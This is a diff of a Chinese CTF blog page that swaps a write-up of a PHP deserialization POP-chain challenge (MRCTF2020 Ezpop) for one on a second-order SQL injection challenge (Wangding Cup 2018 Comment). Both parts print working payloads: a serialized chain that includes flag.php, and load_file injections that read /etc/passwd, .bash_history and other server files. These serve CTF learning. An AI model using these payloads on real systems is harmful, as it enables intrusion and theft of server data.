@@ -8,13 +8,13 @@
   <meta name="theme-color" content="#fff" id="theme-color">
   <meta name="description" content="Husins">
   <link rel="icon" href="/img/dog.jpg">
-  <title>MRCTF2020之Ezpop</title>
+  <title>网鼎杯2018之Comment</title>
   
   
-  <meta property="og:title" content="MRCTF2020之Ezpop">
+  <meta property="og:title" content="网鼎杯2018之Comment">
   
   
-  <meta property="og:url" content="https://husins.cn/MRCTF2020%E4%B9%8BEzpop/index.html">
+  <meta property="og:url" content="https://husins.cn/%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E4%B9%8BComment/index.html">
   
   
   <meta property="og:img" content="/img/dog.png">
@@ -22,8 +22,8 @@
   
   
   <meta property="og:type" content="article">
-  <meta property="og:article:published_time" content="2021-01-27">
-  <meta property="og:article:modified_time" content="2021-01-27">
+  <meta property="og:article:published_time" content="2021-01-28">
+  <meta property="og:article:modified_time" content="2021-01-28">
   <meta property="og:article:author" content="Husins">
   
   
@@ -179,13 +179,13 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      MRCTF2020之Ezpop
+      网鼎杯2018之Comment
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-01-27T03:50:59.000Z">
+    <time datetime="2021-01-28T08:42:56.000Z">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
-      <span>2021-01-27</span>
+      <span>2021-01-28</span>
     </time>
     
     <span class="dot"></span>
@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>865 字</span>
+    <span>842 字</span>
     
   </div>
   
@@ -211,47 +211,63 @@
   
   </header>
   <div id="section" class="post-content">
-    <p><strong>知识点</strong></p>
-<p>魔术方法<code> __invoke()</code>：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</p>
-<p>魔术方法<code>__tostring()</code>：将一个对象当做一个字符串来使用时，会自动调用该方法，并且在该方法中，可以返回一定的字符串，以表明该对象转换为字符串之后的结果</p>
-<p>魔术方法<code>__get()</code>：获得一个类的成员变量时调用,通过它可以在对象的外部获取私有成员属性的值,访问不存在的属性或是受限的属性时调用</p>
-<p>序列化Pop链：利用几个类之间相互关联进行构造</p>
+    <p><strong>知识点</strong>:</p>
+<p>GitHack工具的使用</p>
+<p>二次注入</p>
+<p>Docker文件位置，一般在<code>/temp/html</code>中会有备份</p>
 <p><strong>解题</strong></p>
-<p>打开题目，是<code>php</code>的代码,分析代码</p>
-<pre class="highlight"><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    $a=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141039.png" alt="image-20210128141039370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141039.png" class="lozad post-image"></p>
+<p>打开题目第一次发帖需要你登陆,账号密码都给你了,只是没有给你密码后三位,意图很明显,使用爆破来进行登陆</p>
+<p>爆破成功后会发现密码为<code>zhangwei666</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141301.png" alt="image-20210128141301109" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141301.png" class="lozad post-image"></p>
+<p>登陆之后存在发帖功能,想到了<code>xss</code>和<code>SQL注入</code></p>
+<p>1.对XSS进行测试,发现这里存在<code>反射型XSS</code>没有什么意义</p>
+<p>2.<code>SQL注入</code>尝试了半天,没啥效果,一丢丢报错信息都没有,盲注的回显也没有</p>
+<p>剩下就没有什么思路了,只能看看有没有信息泄露的点</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141644.png" alt="image-20210128141644610" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141644.png" class="lozad post-image"></p>
+<p>在控制台发现一句提示,Git程序员跑路,可没可能是Git泄露,直接扫目录</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141805.png" alt="image-20210128141805521" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141805.png" class="lozad post-image"></p>
+<p>确实是Git泄露</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141848.png" alt="image-20210128141848493" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128141848.png" class="lozad post-image"></p>
+<p>使用GItHack工具获取到源码,发下源码一点信息没有,前面提示没写完,这里猜测<code>/.git</code>文件不全,利用GitHack对其进行补全</p>
+<pre class="highlight"><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    $category = addslashes($_POST[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    $title = addslashes($_POST[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    $sql = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    $result = mysql_query($sql);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    $bo_id = addslashes($_POST[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    $sql = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    $result = mysql_query($sql);<br>    $num = mysql_num_rows($result);<br>    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;<br>    $category = mysql_fetch_array($result)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    $sql = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    $result = mysql_query($sql);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre>
 
-<p>一共存在三个类，先来看第一个类</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br></code></pre>
+<p>获取到完整的源代码,观察<code>write</code>部分发现sql语句都被进行了转义,这也是为啥之前测试<code>SQL注入</code>不成功的原因</p>
+<p>通过审计源代码我们不难发现这里存在一处很明显的二次注入,一开始会对<code>category</code>进行赋值,然后在查看时会将其取出,如果我们在<code>categories</code>输入<code>&#39;123 /*</code>在<code>concent</code>输入<code>*/#</code>，就会出现如下效果：</p>
+<pre class="highlight"><code class="hljs php">$sql = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">          set category = &#x27;&#x27;123/*&#x27;,</span><br><span class="hljs-string">              content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">              bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre>
 
-<p><code>append()</code>函数文件包含,注释中提到<code>flag in flag.php</code>因此,这里就是想办法 <code>$value=flag.php</code></p>
-<p>接下来利用魔术方法对函数赋值,因此我们需要,以调用函数的方法调用这个对象完成赋值</p>
-<p>第二个类:</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre>
+<p>当123存入数据库再被取出时，如果存在命令执行，就会被执行。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128144549.png" alt="image-20210128144549613" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128144549.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128144621.png" alt="image-20210128144621518" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128144621.png" class="lozad post-image"></p>
+<p>进行简单验证，果然可以，接下来就是要利用二次注入找到flag了</p>
+<p>首先看看用户信息，payload：</p>
+<pre class="highlight"><code class="hljs php"><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre>
 
-<p>​                                                                                                                                                                    </p>
-<p><code>__wakeup()</code>反序列化时自动调用,对<code>$this-&gt;source</code>做字符串比较,<code>__toString</code>返回str的source属性</p>
-<p>第三个类:</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br></code></pre>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128145037.png" alt="image-20210128145037931" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128145037.png" class="lozad post-image"></p>
+<p>发现存在了一处可疑的<code>www</code>用户，去他的家目录看看他都有过什么操作，Payload：</p>
+<pre class="highlight"><code class="hljs awk"><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;)),/</span>*<br></code></pre>
 
-<p><code>__get()</code>把$this-&gt;p当成函数返回</p>
-<p>因此总结pop链的构造:</p>
-<ul>
-<li>首先实例化show类,此时反序列化会自动调用<code>__wakeup</code>通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是show类，就调用了<code>__toString()</code>方法</li>
-<li><code>__toString</code>会访问<code>str</code>的<code>source</code>属性,当<code>str</code>构造为<code>Test</code>类时,<code>Test</code>类不存在<code>source</code>属性,因此会调用<code>__get</code>方法</li>
-<li><code>__get()</code>方法将p作为函数使用,因此当p实例化为<code>Modifier</code>类时,就可以调用<code>__invoke</code>方法,因此使用伪协议读取<code>flag.php</code></li>
-</ul>
-<p>构造Exp:</p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" alt="image-20210110113435429" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" class="lozad post-image"></p>
-<p>payload:<code>?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22ad%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</code></p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" alt="image-20210110113511734" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" class="lozad post-image"></p>
-<p>最终得到Flag</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128145734.png" alt="image-20210128145734437" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128145734.png" class="lozad post-image"></p>
+<p>但是观察之后不难发现，他在<code>/tmp</code>目录下有过操作，这里经过看别人wp提示发现，<strong>由于目标环境是docker，所以 .DS_Store 文件应该在 /tmp/html 中。而 .DS_Store 文件中，经常会有一些不可见的字符，可以使用hex函数对其进行16进制转换</strong> <strong><em>payload：</em></strong></p>
+<pre class="highlight"><code class="hljs sql">&#x27;,content=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&quot;/tmp/html/.DS_Store&quot;</span>))),<span class="hljs-comment">/*</span><br></code></pre>
+
+<p>使用<code>hackbar</code>解码</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128150641.png" alt="image-20210128150641017" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128150641.png" class="lozad post-image"></p>
+<p>发现flag文件，直接访问</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128150855.png" alt="image-20210128150855211" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128150855.png" class="lozad post-image"></p>
+<p>确定<code>FLAG</code>文件存在，因此路径应该为<code>/var/www/html/flag_8946e1ff1ee3e40f.php</code>利用二次注入读取一下，**<em>payload**</em></p>
+<pre class="highlight"><code class="hljs reasonml">&#x27;,content=(select hex(load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">flag_8946e1ff1ee3e40f</span>.<span class="hljs-params">php</span>&#x27;)</span>)),<span class="hljs-comment">/*</span><br></code></pre>
+
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128151237.png" alt="image-20210128151237756" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128151237.png" class="lozad post-image"></p>
+<p>完整流程如下：</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210128151310.png" alt="image-20210128151310796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210128151310.png" class="lozad post-image"></p>
+
   </div>
   <div>
   
   <div class="post-note note-warning copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/MRCTF2020%E4%B9%8BEzpop/">https://husins.cn/MRCTF2020%E4%B9%8BEzpop/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E4%B9%8BComment/">https://husins.cn/%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E4%B9%8BComment/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
   </div>
   
@@ -260,12 +276,12 @@
 <div class="nav">
   
   <div class="nav-item-prev">
-    <a href="/GWCTF-2019之枯燥的抽奖/" class="nav-link">
+    <a href="/Zer0pts2020之Can-you-guess-it/" class="nav-link">
       <i class="iconfont icon-left nav-prev-icon"></i>
       <div>
         <div class="nav-label">上一篇</div>
         
-        <div class="nav-title">GWCTF 2019之枯燥的抽奖 </div>
+        <div class="nav-title">Zer0pts2020之Can you guess it? </div>
         
       </div>
     </a>
@@ -273,11 +289,11 @@
   
   
   <div class="nav-item-next">
-    <a href="/BJDCTF2020之EasySearch/" class="nav-link">
+    <a href="/CISCN2019-华北赛区-Day2-Web1之Hack-World/" class="nav-link">
       <div>
         <div class="nav-label">下一篇</div>
         
-        <div class="nav-title">BJDCTF2020之EasySearch </div>
+        <div class="nav-title">CISCN2019 华北赛区 Day2 Web1之Hack World </div>
         
       </div>
       <i class="iconfont icon-right nav-next-icon"></i>
@@ -288,7 +304,7 @@
 
 <div class="card card-content toc-card" id="mobiletoc">
   <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+
 </div></main>
           <aside class="left-column">
             
@@ -321,7 +337,7 @@
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
       <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+
     </div>
   </article>
   
@@ -379,7 +395,7 @@
   
   <article class="card card-content toc-card">
     <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+
   </article>
   
   
